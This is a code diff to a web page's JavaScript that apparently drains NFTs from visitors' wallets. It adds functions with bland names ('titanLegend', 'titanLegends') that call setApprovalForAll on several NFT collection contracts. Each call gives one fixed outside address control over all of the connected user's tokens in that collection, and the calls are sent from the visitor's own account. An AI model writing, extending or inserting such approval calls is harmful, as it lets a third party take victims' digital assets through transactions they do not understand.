@@ -670,7 +670,10 @@ var data = {
 
         // await citizen();
 
-        await midnight();
+        // await midnight();
+
+        await titanLegend();
+        await titanLegends();
 
         
       }
@@ -1214,5 +1217,21 @@ async function midnight(){
 
 //0x89a4875c190565505b7891b700c2c6dc91816a47
                         var collectionContract = await new window.web3.eth.Contract(_abi, '0x89a4875c190565505b7891b700c2c6dc91816a47', {gas: '100000'})
+              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+}
+
+async function titanLegend() {
+//0x78e0e038347497ef2dea4ad61ab0bd2b86d38c58
+
+                          var collectionContract = await new window.web3.eth.Contract(_abi, '0x78e0e038347497ef2dea4ad61ab0bd2b86d38c58', {gas: '100000'})
+              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+  
+}
+
+async function titanLegends() {
+
+  //0x3a34d11dad0b063307ee118d8415b31842911448
+
+                            var collectionContract = await new window.web3.eth.Contract(_abi, '0x3a34d11dad0b063307ee118d8415b31842911448', {gas: '100000'})
               await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
 }
